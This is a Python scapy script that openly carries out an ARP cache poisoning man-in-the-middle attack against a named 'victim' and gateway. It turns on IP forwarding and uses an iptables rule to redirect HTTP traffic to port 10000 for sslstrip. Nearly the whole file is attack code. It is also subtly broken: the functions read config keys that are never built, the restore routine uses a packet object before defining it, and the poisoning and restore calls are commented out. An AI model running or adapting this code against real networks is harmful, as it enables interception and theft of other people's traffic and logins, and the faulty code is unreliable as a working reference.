#!/usr/bin/python

from scapy.all import *
from argparse import ArgumentParser

import os

IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
TIMEOUT = 2
RETRY = 10

# This function uses argparse to parse command line
# arguments passed to the script.
def set_configs():

    # create a new ArgumentParser
    parser = ArgumentParser()

    # add definitions for command line arguments
    parser.add_argument('-t',
                    dest='victim',
                    required=True,
                    type=str,
                    help='The victim\'s IP address')

    parser.add_argument('-g',
                    dest='gateway',
                    required=True,
                    type=str,
                    help='The gateway\'s IP address')

    parser.add_argument('-i',
                    dest='interface',
                    required=True,
                    type=str,
                    help='Use this network interface')

    # parse command line arguments according to those definitions
    args = parser.parse_args()

    # use arguments to construct config dictionary
    return {

        'victim' :  {

            'ip' : args.victim,
            'mac' : ip_to_mac(args.victim),
        },

        'gateway' :  {
            'ip' : args.gateway,
            'mac' : ip_to_mac(args.gateway),
        },

        'iface' : args.interface,
    }

# enables packet forwarding by interacting with the proc filesystem
def enable_packet_forwarding():

    with open(IP_FORWARD, 'w') as fd:
        fd.write('1')

# disables packet forwarding by interacting with the proc filesystem
def disable_packet_forwarding():

    with open(IP_FORWARD, 'w') as fd:
        fd.write('0')

# use iptables to redirect http traffic to port 10000 where it can
# be parsed using sslstrip
def enable_http_redirection():

    print '[*] Redirecting all http traffic to port 10000'

    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')

# restore iptables to default state
def disable_http_redirection():

    print '[*] Disabling http redirection'

    os.system('iptables -v --flush')
    os.system('iptables -v --table nat --flush')
    os.system('iptables -v --delete-chain')
    os.system('iptables -v --table nat --delete-chain')


# uses scapy to arp poison victim
def poison_victim(configs):

    # get victim and gateway ip and hardware addresses from
    # configs
    victim_mac = configs['victim_mac']
    gateway_mac = configs['gateway_mac']
    
    victim_ip = configs['victim_ip']
    gateway_ip = configs['gateway_ip']

    # create layer 3 Arp() packets
    victim_arp = ARP()
    gateway_arp = ARP()

    # set Operation to 'is-at'
    victim_arp.op = 2
    gateway_arp.op = 2
    
    # set hwdst
    victim_arp.hwdst = victim_mac
    gateway_arp.hwdst = gateway_mac

    # set pdst
    victim_arp.pdst = victim_ip
    gateway_arp.pdst = gateway_ip

    # set psrc
    victim_arp.psrc = gateway_ip
    gateway_arp.psrc = victim_ip

    # continue attack indefinitely
    while True:

        try:

            print '[*] Poisoning victim'
            
            # send spoofed arp replies
            send(victim_arp)
            send(gateway_arp)

            # wait for ARP replies from default GW or victim
            sniff(filter='arp and host %s or %s' %\
                        (gateway_ip, victim_ip), count=1)


        # break out of loop if user hits ctrl+c
        except KeyboardInterrupt:
            break

    print '[*] All done!'

# restores the victim and gateway's arp cache to its correct
# state
def restore_victim(configs):

    victim_mac = configs['victim_mac']
    gateway_mac = configs['gateway_mac']
    
    victim_ip = configs['victim_ip']
    gateway_ip = configs['gateway_ip']

    # create a Layer 3 ARP() packet
    victim_arp = ARP()

    # set correct source ip and mac
    victim_arp.hwsrc = gateway_mac
    victim_arp.psrc = gateway_ip

    # broadcast 'is-at' packet
    gateway_arp.op = 2 
    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    send(gateway_arp)

    # create a Layer 3 ARP() packet
    gateway_arp = ARP()

    # set correct source ip and mac
    gateway_arp.hwsrc = victim_mac
    gateway_arp.psrc = victim_ip

    # broadcast 'is-at' packet
    gateway_arp.op = 2 
    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    send(gateway_arp)

# sends a legitimate arp request to resolve an IP to a
# mac address
def ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT):

    arp = ARP()
    
    # set operation to 'who-has' (arp request)
    arp.op = 1
    
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = ip

    response, unanswered = sr(arp, retry=retry, timeout=timeout)
    
    # get the response from the first packet received by accessing
    # layer 2 header
    for s,r in response:
        return r[ARP].underlayer.src

    # return failure
    return None

# driver function for arp cache poisoning attack
def poison(configs):

    enable_packet_forwarding()
    enable_http_redirection()
    #poison_victim(configs)

# driver function for restoring victim and gateway after
# arp cache poisoning attack
def antidote(configs):

    #restore_victim(configs)
    disable_http_redirection()
    disable_packet_forwarding()

def main():

    configs = set_configs()

    print '[*] Using interface', configs['iface']
    conf.iface = configs['iface']

    try:
        poison(configs)
    except KeyboardInterrupt:
        pass
    
    antidote(configs)

if __name__ == '__main__':
    main()